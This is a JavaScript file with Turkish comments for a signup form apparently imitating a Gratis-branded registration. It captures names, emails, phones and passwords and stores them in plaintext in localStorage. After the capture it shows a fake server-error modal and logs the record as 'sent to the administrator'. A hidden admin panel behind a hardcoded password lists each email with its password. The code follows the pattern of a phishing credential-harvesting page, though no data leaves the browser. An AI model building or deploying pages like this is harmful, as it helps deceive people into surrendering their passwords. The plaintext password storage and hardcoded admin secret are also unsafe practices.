// Kullanıcı verilerini saklamak için dizi
let users = JSON.parse(localStorage.getItem('gratisUsers')) || [];

// Doğrulama fonksiyonları
const validators = {
    name: (name) => name && name.length >= 3 && /^[a-zA-ZğüşıöçĞÜŞİÖÇ\s]+$/.test(name),
    email: (email) => email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email),
    phone: (phone) => !phone || phone === '' || /^05[0-9]{9}$/.test(phone.replace(/\D/g, '')),
    password: (password) => password && password.length >= 4
};

// Form gönderimi
document.getElementById('registrationForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    // Form değerlerini al
    const name = document.getElementById('name').value.trim();
    const email = document.getElementById('email').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const password = document.getElementById('password').value;
    const newsletter = document.getElementById('newsletter').checked;
    
    // Doğrulama yap
    const isNameValid = validators.name(name);
    const isEmailValid = validators.email(email);
    const isPhoneValid = validators.phone(phone);
    const isPasswordValid = validators.password(password);
    
    // Hataları göster
    document.getElementById('nameError').style.display = isNameValid ? 'none' : 'block';
    document.getElementById('emailError').style.display = isEmailValid ? 'none' : 'block';
    document.getElementById('phoneError').style.display = isPhoneValid ? 'none' : 'block';
    document.getElementById('passwordError').style.display = isPasswordValid ? 'none' : 'block';
    
    if (!isNameValid || !isEmailValid || !isPasswordValid || !isPhoneValid) {
        showMessage('error', 'Lütfen tüm zorunlu alanları doğru şekilde doldurun.');
        return;
    }
    
    // Kullanıcıyı kaydet
    const userData = {
        name: name,
        email: email,
        phone: phone || 'Belirtilmemiş',
        password: password,
        newsletter: newsletter,
        timestamp: new Date().toLocaleString('tr-TR'),
        ip: generateRandomIP(),
        id: Date.now()
    };
    
    users.push(userData);
    localStorage.setItem('gratisUsers', JSON.stringify(users));
    
    this.reset();
    document.getElementById('newsletter').checked = true;
    showMessage('success', '✅ Kayıt başarılı');
    
    setTimeout(showServerError, 2000);
    simulateDataTransfer(userData);
});

// Sunucu hatası göster
function showServerError() {
    document.getElementById('serverErrorModal').style.display = 'flex';
}

// Sunucu hatasını kapat
function closeServerError() {
    document.getElementById('serverErrorModal').style.display = 'none';
}

// Mesaj göster
function showMessage(type, message) {
    const successMsg = document.getElementById('successMessage');
    const errorMsg = document.getElementById('errorMessage');
    
    if (type === 'success') {
        successMsg.textContent = message;
        successMsg.style.display = 'block';
        errorMsg.style.display = 'none';
        setTimeout(() => successMsg.style.display = 'none', 5000);
    } else {
        errorMsg.textContent = message;
        errorMsg.style.display = 'block';
        successMsg.style.display = 'none';
        setTimeout(() => errorMsg.style.display = 'none', 5000);
    }
}

// Simüle veri iletimi
function simulateDataTransfer(userData) {
    console.log('📤 Yöneticiye gönderilen veri:', {
        ...userData,
        password: userData.password
    });
}

// Rastgele IP oluştur
function generateRandomIP() {
    return `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

// Yönetici girişi
function showAdminLogin() {
    const password = prompt('Yönetici şifresini girin:');
    if (password === 'corbavarmıbeyler123') {
        showAdminPanel();
    } else {
        alert('❌ Yetkisiz erişim!');
    }
}

// Yönetici paneli
function showAdminPanel() {
    if (users.length === 0) {
        alert('Henüz kayıtlı kullanıcı bulunmamaktadır.');
        return;
    }
    
    const userList = users.map(user => 
        `👤 İsim: ${user.name}\n📧 E-posta: ${user.email} ${user.password}\n📞 Telefon: ${user.phone}\n🕒 Kayıt Tarihi: ${user.timestamp}\n🌐 IP: ${user.ip}\n────────────────────\n`
    ).join('');
    
    alert('👨‍💼 YÖNETİCİ PANELİ\n\nToplam Kayıt: ' + users.length + '\n\n' + userList);
}

// Alan doğrulama
document.querySelectorAll('input[required]').forEach(input => {
    input.addEventListener('blur', function() {
        validateField(this.id, this.value);
    });
});

function validateField(fieldId, value) {
    const errorElement = document.getElementById(fieldId + 'Error');
    let isValid = false;
    
    switch(fieldId) {
        case 'name':
            isValid = validators.name(value);
            break;
        case 'email':
            isValid = validators.email(value);
            break;
        case 'phone':
            isValid = validators.phone(value);
            break;
        case 'password':
            isValid = validators.password(value);
            break;
    }
    
    errorElement.style.display = isValid ? 'none' : 'block';
}
